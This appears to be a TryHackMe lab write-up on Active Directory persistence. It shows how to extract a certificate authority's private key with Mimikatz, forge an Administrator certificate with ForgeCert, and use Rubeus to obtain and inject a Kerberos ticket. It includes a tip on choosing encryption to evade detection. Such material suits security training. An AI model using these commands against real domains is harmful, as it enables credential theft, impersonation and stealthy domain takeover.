We could simply steal the private key of the root CA's certificate to generate our own certificates whenever we feel like it.<br>
>what is the Certificate Authority ?

A Certificate Authority (CA) is an entity that issues and manages digital certificates used to verify identities and secure communications within a network, such as in Active Directory (AD). It ensures that certificates are valid, trusted, and used for secure authentication and encryption across the network.<br>

**Extracting the Private Key**

The private key of the CA is stored on the CA server itself. To extract the private key from a Certificate Authority (CA) in an environment using Active Directory Certificate Services (AD CS), you can use tools like Mimikatz. The private key is stored on the CA server and if this key is not protected by a Hardware Security Module (HSM), Mimikatz can be used to extract the CA certificate and its private key. After gaining access to the CA server via SSH, you can load Mimikatz to perform this extraction.
<br>
To dump the DC certs and dump the private keys too:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched
mimikatz # crypto::certificates /systemstore:local_machine /export
```
![Screenshot from 2024-09-06 20-38-17](https://github.com/user-attachments/assets/0a13a442-3515-45b4-8242-24d7836c642c)

The **za-THMDC-CA.pfx** certificate is the one we are particularly interested in, for example. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of```mimikatz```.<br>

**Generating our own Certificates**

Now that we have the private key and root CA certificate, we can use the ```ForgeCert``` tool to forge a Client Authenticate certificate for any user we want. Let's use ForgeCert to generate a new certificate: 

```
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```
> CaCertPath - The path to our exported CA certificate.<br>
> CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of ```mimikatz```.<br>
> Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.<br>
> SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.<br>
> NewCertPath - The path to where ForgeCert will store the generated certificate.<br>
> NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.<br>

We can use ```Rubeus``` to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:Admin.kirbi /domain:<DomainName> /dc:<IP of domain controller>
```
Let's break down the parameters:

  >  /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated.<br>
  >  /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert<br>
  >  /certificate - Path to the certificate we have generated<br>
  >  /password - The password for our certificate file<br>
  >  /outfile - The file where our TGT will be output to<br>
  >  /domain - The FQDN of the domain we are currently attacking<br>
  >  /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running<br>



Now we can use Mimikatz to load the TGT and authenticate to THMDC:
```
mimikatz # kerberos::ptt Admin.kirbi
```








